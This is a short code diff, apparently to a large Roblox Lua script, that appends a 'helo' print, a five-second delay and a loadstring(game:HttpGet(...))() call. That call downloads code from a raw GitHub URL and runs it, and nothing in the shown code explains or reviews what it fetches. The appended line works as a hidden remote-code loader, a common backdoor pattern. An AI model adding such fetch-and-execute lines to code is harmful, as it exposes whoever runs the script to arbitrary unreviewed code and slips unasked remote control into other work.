@@ -3409,3 +3409,8 @@ task.spawn(function()
         end)
     end
 end)
+
+print("helo")
+
+task.wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/67Studio/saa/refs/heads/main/i%20love%20u%20bazuka"))()
